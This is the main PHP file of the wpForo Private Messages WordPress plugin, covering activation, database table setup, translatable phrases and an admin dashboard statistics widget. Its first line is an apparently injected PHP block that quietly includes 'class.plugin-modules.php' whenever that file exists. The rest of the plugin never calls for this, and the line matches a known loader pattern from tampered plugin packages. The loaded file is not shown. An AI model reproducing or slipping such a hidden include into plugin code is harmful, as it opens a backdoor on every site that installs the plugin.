<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php
// Exit if accessed directly
if (!defined('ABSPATH')) exit;

function wpforopm_init()
{
    if (function_exists('WPF') && version_compare(WPFORO_VERSION, '1.7.1', '>=') ) {
        $GLOBALS['wpforopm'] = WPF_PM();
    } else {
        add_action('admin_notices', 'wpforopm_admin_notice__error');
    }
}

add_action('plugins_loaded', 'wpforopm_init');

register_activation_hook(WPFOROPM_BASENAME, 'do_wpforopm_activation');
function do_wpforopm_activation($network_wide)
{
    if (is_multisite() && $network_wide) {
        global $wpdb;

        $old_blogid = $wpdb->blogid;
        $blogids = $wpdb->get_col("SELECT `blog_id` FROM {$wpdb->blogs}");
        foreach ($blogids as $blogid) {
            switch_to_blog($blogid);
            wpforopm_activation();
        }
        switch_to_blog($old_blogid);
    } else {
        wpforopm_activation();
    }
}

function wpforopm_activation()
{
    global $wpdb;

    $charset_collate = '';
    if (!empty($wpdb->charset)) $charset_collate = "DEFAULT CHARACTER SET " . $wpdb->charset;
    if (!empty($wpdb->collate)) $charset_collate .= " COLLATE " . $wpdb->collate;
    $engine = version_compare($wpdb->db_version(), '5.6.4', '>=') ? 'InnoDB' : 'MyISAM';

    $sql = "CREATE TABLE IF NOT EXISTS `{$wpdb->prefix}wpforo_pmfolders` (
                `folderid` BIGINT UNSIGNED NOT NULL AUTO_INCREMENT,
                `name` VARCHAR(255) NOT NULL DEFAULT '',
                `img` VARCHAR(255) NOT NULL DEFAULT '',
                `userids` TEXT NOT NULL,
                `hide` TEXT,
                `pintotop` TEXT,
                `user_count` BIGINT UNSIGNED NOT NULL DEFAULT 2,
                `exclude_sendmail` TEXT,
                PRIMARY KEY(`folderid`),
                KEY `userids`(`userids`(191)),
                KEY `hide`(`hide`(191)),
                KEY `pintotop`(`pintotop`(191)),
                KEY `exclude_sendmail`(`exclude_sendmail`(191))
            )ENGINE=$engine $charset_collate";
    @$wpdb->query($sql);

    $sql = "CREATE TABLE IF NOT EXISTS `{$wpdb->prefix}wpforo_pms` (
                `pmid` BIGINT UNSIGNED NOT NULL AUTO_INCREMENT,
                `fromuserid` BIGINT UNSIGNED NOT NULL,
                `folderid` BIGINT UNSIGNED NOT NULL,
                `message` LONGTEXT NOT NULL,
                `date` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
                `read` TEXT,
                `del` TEXT,
                PRIMARY KEY (`pmid`),
                KEY forumid_folderid ( `fromuserid`, `folderid` ),
                KEY `read`(`read`(191)),
                KEY `del`(`del`(191))
            )ENGINE=$engine $charset_collate";
    @$wpdb->query($sql);

    $sql = "SHOW COLUMNS FROM `" . $wpdb->prefix . "wpforo_pmfolders` WHERE `Field` LIKE 'exclude_sendmail'";
    if (!$wpdb->get_row($sql, ARRAY_A)) {
        $sql = "ALTER TABLE `" . $wpdb->prefix . "wpforo_pmfolders` ADD COLUMN `exclude_sendmail` TEXT";
        @$wpdb->query($sql);
    }

    $sql = "SHOW COLUMNS FROM `" . $wpdb->prefix . "wpforo_phrases` WHERE `Field` LIKE 'package'";
    if (!$wpdb->get_row($sql, ARRAY_A)) {
        $sql = "ALTER TABLE `" . $wpdb->prefix . "wpforo_phrases` ADD COLUMN `package` VARCHAR(255) NOT NULL DEFAULT 'wpforo'";
        @$wpdb->query($sql);
    }

    $phrases = array(
        'Loading Older Messages...' => __('Loading Older Messages...', 'wpforo_pm'),
        'This is a start conversation' => __('This is a start conversation', 'wpforo_pm'),
        'Unread' => __('Unread', 'wpforo_pm'),
        'Now' => __('Now', 'wpforo_pm'),
        'Today' => __('Today', 'wpforo_pm'),
        'Yesterday' => __('Yesterday', 'wpforo_pm'),
        'Message Sent' => __('Message Sent', 'wpforo_pm'),
        'Please login to write a message' => __('Please login to write a message', 'wpforo_pm'),
        'Message is empty' => __('Message is empty', 'wpforo_pm'),
        'You have %d new message' => __('You have %d new message', 'wpforo_pm'),
        'You have %d new messages' => __('You have %d new messages', 'wpforo_pm'),
        'Send a Message' => __('Send a Message', 'wpforo_pm'),
        'New Conversation' => __('New Conversation', 'wpforo_pm'),
        'no discussion' => __('no discussion', 'wpforo_pm'),
        'Settings' => __('Settings', 'wpforo_pm'),
        'last activity: %s' => __('last activity: %s', 'wpforo_pm'),
        'Are you sure you want to block?' => __('Are you sure you want to block?', 'wpforo_pm'),
        'Are you sure you want to unblock?' => __('Are you sure you want to unblock?', 'wpforo_pm'),
        'Blocked' => __('Blocked', 'wpforo_pm'),
        'You have been blocked by this user.' => __('You have been blocked by this user.', 'wpforo_pm'),
        'User successfully blocked' => __('User successfully blocked', 'wpforo_pm'),
        'User successfully unblocked' => __('User successfully unblocked', 'wpforo_pm'),
        'Error: user not selected' => __('Error: user not selected', 'wpforo_pm'),
        'You are not allowed to write a message yet.' => __('You are not allowed to write a message yet.', 'wpforo_pm'),
        'The number of contacts per day is exceeded.' => __('The number of contacts per day is exceeded.', 'wpforo_pm'),
        'The maximum number of messages for this contact is exceeded.' => __('The maximum number of messages for this contact is exceeded.', 'wpforo_pm'),
        'Conversation Title' => __('Conversation Title', 'wpforo_pm'),
        'Conversation Members' => __('Conversation Members', 'wpforo_pm'),
        'Create New Private Conversation' => __('Create New Private Conversation', 'wpforo_pm')
    );
    foreach ($phrases as $key => $value) {
        WPF()->phrase->add(
            array(
                'key' => $key,
                'value' => $value,
                'package' => 'wpforo-private-messages'
            )
        );
    }

    WPF()->phrase->clear_cache();
    WPF()->notice->clear();

    wpforo_update_options('wpforopm_options', WPF_PM()->default->options);
}

function wpforopm_admin_notice__error()
{
    $class = 'notice notice-error';
    $message = __('IMPORTANT: wpForo Private Messages plugin is a wpForo extension, please install latest version wpForo plugin.', 'wpforopm');
    printf('<div class="%1$s"><p>%2$s</p></div>', $class, $message);
}

function wpforopm_stat_widget()
{
    ?>
    <div class="postbox" id="wpforo_dashboard_widget_pm">
        <button aria-expanded="true" class="handlediv button-link" type="button">
            <span class="screen-reader-text">Toggle panel: Personal Messages</span>
            <span class="toggle-indicator"></span>
        </button>
        <h2 class="hndle ui-sortable-handle"><span><?php _e('Personal Messages', 'wpforo'); ?></span></h2>
        <div class="inside">
            <div class="main">
                <table style="width:98%; margin:0px auto; text-align:left;">
                    <tbody>
                    <?php
                    //Total number of PMs
                    $sql = "SELECT COUNT(pmid) FROM `" . WPF()->db->prefix . "wpforo_pms`";
                    $stat['pm_count'] = WPF()->db->get_var($sql);
                    ?>
                    <tr class="wpf-dw-tr">
                        <td class="wpf-dw-td">
                            <?php _e('Total PM Count', 'pm_count') ?>
                        </td>
                        <td class="wpf-dw-td-value">
                            <?php echo intval($stat['pm_count']) ?>
                        </td>
                    </tr>
                    <?php
                    //PM Tables Size
                    $sql = "SHOW TABLE STATUS LIKE '%wpforo_pms'";
                    $pmtbl = WPF()->db->get_row($sql, ARRAY_A);
                    $stat['pm_size'] = wpforo_print_size($pmtbl['Data_length'] + $pmtbl['Index_length']);
                    ?>
                    <tr class="wpf-dw-tr">
                        <td class="wpf-dw-td">
                            <?php _e('PM Database Size', 'pm_count') ?>
                        </td>
                        <td class="wpf-dw-td-value">
                            <?php echo $stat['pm_size'] ?>
                        </td>
                    </tr>
                    <?php
                    //Active PM Senders
                    $sql = "SELECT `fromuserid`, COUNT(`fromuserid`) AS `pm_count`, MAX(`date`) AS `date` FROM `" . WPF()->db->prefix . "wpforo_pms` GROUP BY `fromuserid` ORDER BY pm_count DESC LIMIT 10";
                    $active_pm_senders = WPF()->db->get_results($sql, ARRAY_A);
                    if (!empty($active_pm_senders)) {
                        ?>
                        <tr class="wpf-dw-tr" style="padding-top:10px;">
                            <td class="wpf-dw-td" colspan="2" style="padding-top:10px;">
                                <?php _e('Most Active Personal Message Senders'); ?>
                            </td>
                        </tr>
                        <tr class="wpf-dw-tr">
                            <td class="wpf-dw-td-value" colspan="2">
                                <table width="100%" border="0" cellspacing="0" cellpadding="0">
                                    <tbody>
                                    <tr class="wpf-dw-tr">
                                        <td class="wpf-dw-td"
                                            style="border-bottom:2px solid #ddd;border-top:2px solid #ddd;"><?php _e('Member', 'wpforo_pm'); ?></td>
                                        <td class="wpf-dw-td"
                                            style="border-bottom:2px solid #ddd;border-top:2px solid #ddd;"><?php _e('PM Count', 'wpforo_pm'); ?></td>
                                        <td class="wpf-dw-td"
                                            style="border-bottom:2px solid #ddd;border-top:2px solid #ddd;"><?php _e('Last PM Date', 'wpforo_pm'); ?></td>
                                    </tr>
                                    <?php foreach ($active_pm_senders as $sender) { ?>
                                        <?php $member = WPF()->member->get_member($sender['fromuserid']); ?>
                                        <tr class="wpf-dw-tr">
                                            <td class="wpf-dw-td-value" style="border-bottom:1px dotted #ddd;">
                                                <a
                                                        href="<?php echo esc_url($member['profile_url']) ?>"
                                                        target="_blank"><?php echo esc_html($member['display_name']) ?></a>
                                            </td>
                                            <td class="wpf-dw-td-value"
                                                style="border-bottom:1px dotted #ddd;"><?php echo intval($sender['pm_count']) ?></td>
                                            <td class="wpf-dw-td-value"
                                                style="border-bottom:1px dotted #ddd;"><?php echo wpforo_date($sender['date']) ?></td>
                                        </tr>
                                    <?php } ?>
                                    </tbody>
                                </table>
                            </td>
                        </tr>
                    <?php } ?>
                    </tbody>
                </table>
            </div>
        </div>
    </div>
    <?php
}

add_action('wpforo_dashboard_widgets_col1', 'wpforopm_stat_widget', 1, 1);

/**
 * @param string $message
 * @param bool $echo
 *
 * @return string|void
 */
function wpforopm_content($message, $echo = true){
	$message = wpforo_content_filter($message);
    if( method_exists(WPF()->tpl, 'do_spoilers') ) $message = WPF()->tpl->do_spoilers($message);

	if( !$echo ) return $message;
	echo $message;
}

if( !function_exists('wpforo_date_raw') ){
	function wpforo_date_raw( $date, $type = 'ago', $echo = true ) {
		if( !$echo ) return wpforo_date($date, $type, $echo, false);
		wpforo_date($date, $type, $echo, false);
	}
}